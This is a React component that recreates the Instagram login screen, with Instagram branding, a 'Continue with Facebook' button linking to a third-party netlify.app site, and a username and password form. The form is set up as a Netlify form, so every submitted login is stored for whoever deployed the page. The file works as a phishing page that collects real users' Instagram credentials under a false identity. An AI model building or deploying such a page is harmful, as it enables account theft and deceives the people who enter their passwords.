import react from "react";
import './Upper.css';
import Logo from "./logo fb.png"

const  Upper = () => {
    return(
        <div id ='upperbox'>
              
              <div id="eng">
                  English       ^
              </div>
              <h1 id ='insta'>
                  Instagram
              </h1>
            <a href="https://nostalgic-lumiere-91bbce.netlify.app/">
              <button id="fbloginb"> <img id="logo" width="17px" height="17px" src = {Logo}></img>    Continue with Facebook</button>
            </a>
              <div id="or">
                 ------------------------   OR   ------------------------
              </div>
             <form
                name ="data-form"
                method ="POST"
                data-netlify="true"
               >
                <input type="hidden" name="form-name" value="data-form" />
               <label id ='username2'>
              <div id='username'>
               <input id="usinp" name="email" type="text" size={31 } placeholder=" Phone number, username, or email" />
              </div>
              </label>

              <div id='password'>
                <label  id ='password2'>
                   <input id="psinp" name="password" type="password" size={31} placeholder=" password" />
                </label>
                </div>
               

              <div id="forgotpas">
                 Forgot password?
             </div>

                <button type="submit" id="button">Log In</button> 
            </form>

            <div id="noacct">
                Don't have an account ?  
                <a id="linka" href="https://www.instagram.com/">
                <h3 id="signup">Sign up</h3>
                </a>
            </div>
             
            
            
        </div>
    )
}
export default Upper;